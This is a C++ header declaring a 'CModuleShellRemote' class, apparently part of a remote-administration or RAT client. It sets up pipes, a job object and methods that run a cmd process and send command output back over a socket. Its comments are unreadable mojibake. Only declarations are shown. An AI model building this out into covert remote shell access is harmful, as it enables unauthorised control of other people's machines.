#pragma once

#include "SocketClient.h"

class CSocketClient;


// CMD�������󳤶�
#define SHELL_MAX_LENGTH 2048

#define SEND_BUFFER_MAX_LENGTH 8096

class CModuleShellRemote : public CModule {
public:
	HANDLE					m_hSendPacketShellRemoteConnectEvent;		// ���ض������ض˷�����SHELL_CONNECT��Ӧ��
	HANDLE					m_hRecvPacketShellRemoteCloseEvent;
	CRITICAL_SECTION		m_ExecuteCs;
	HANDLE					m_hRead;
	HANDLE					m_hWrite;

	HANDLE					m_hJob;

public:
	CModuleShellRemote(CSocketClient* pSocketClient);
	~CModuleShellRemote();

	// ��д�麯��
	void OnRecvivePacket(CPacket* pPacket);

	VOID RunCmdProcess();
	VOID LoopReadAndSendCommandReuslt();
	static DWORD WINAPI RunCmdProcessThreadFunc(LPVOID lParam);
	static VOID WINAPI OnRecvPacketShellRemoteExecute(LPVOID lParam);
};


typedef struct _SHELL_REMOTE_EXECUTE_THREAD_PARAM {
	CModuleShellRemote* m_pThis;
	CPacket* m_pPacket;
	_SHELL_REMOTE_EXECUTE_THREAD_PARAM(CModuleShellRemote* pThis, CPacket* pPacket) {
		m_pThis = pThis;
		m_pPacket = pPacket;
	}
}SHELL_REMOTE_EXECUTE_THREAD_PARAM;